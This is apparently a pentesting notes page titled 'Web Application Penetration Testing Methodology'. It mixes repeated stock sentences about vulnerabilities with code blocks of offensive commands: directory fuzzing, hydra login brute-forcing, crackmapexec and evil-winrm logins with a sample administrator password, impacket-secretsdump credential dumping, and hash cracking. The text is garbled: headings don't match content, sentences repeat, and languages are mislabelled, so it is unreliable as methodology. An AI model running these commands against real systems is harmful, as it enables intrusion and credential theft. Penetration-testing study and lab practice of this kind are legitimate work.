---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, lateral movement, windows, linux, networking"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-841.html"
URL_IMAGES: ""
Date: "2025-11-29"
Tags: "Blue Team, Lateral Movement, Windows, Linux, Networking"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-841"
Permalink: "/notes/note-web-application-penetration-testing-meth-841.html"
BtnLabel: "Read Notes"
Pick: 0
---
## mimikatz

### DNS

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

> **Note:** Path Traversal was identified as the primary attack vector in this scenario.

## bloodhound

### IDOR

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.165.96/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.181.108/FUZZ
crackmapexec smb 10.71.139.93 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Unconstrained Delegation

### john

```bash
feroxbuster -h
nmap -sCV -p587,1433,23 10.121.175.125 -oN scan.txt
crackmapexec smb 10.63.6.167 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.118.129.212 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.84.175.231 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

## C#

### kerbrute

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.83.112.130 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.165.203
crackmapexec smb 10.31.78.106 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

## Spring

### Elasticsearch

> **Note:** Resource-Based Constrained Delegation was identified as the primary attack vector in this scenario.

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```powershell
feroxbuster -h
evil-winrm -i 10.70.252.97 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.85.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
